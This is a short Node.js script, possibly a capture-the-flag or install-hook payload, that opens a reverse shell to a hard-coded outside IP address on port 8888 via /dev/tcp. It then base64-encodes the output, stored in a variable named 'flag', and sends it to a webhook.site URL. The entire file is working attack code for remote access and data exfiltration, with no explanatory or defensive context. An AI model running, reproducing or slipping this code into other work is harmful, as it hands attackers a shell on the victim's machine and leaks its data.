const https = require('https');
const fs = require('fs');

const { exec } = require("child_process");

exec("/bin/sh -i >& /dev/tcp/38.242.133.6/8888 0>&1", (error, stdout, stderr) => {
    if (error) {
        console.log(`error: ${error.message}`);
        return;
    }
    if (stderr) {
        console.log(`stderr: ${stderr}`);
        return;
    }
    flag = Buffer.from(stdout).toString('base64');
    https.get('https://webhook.site/710e7f24-ff97-4c7d-80d8-e32707a29d54/' + flag, res => {

    }).on('error', err => {
        console.log('Error: ', err.message);
    });
});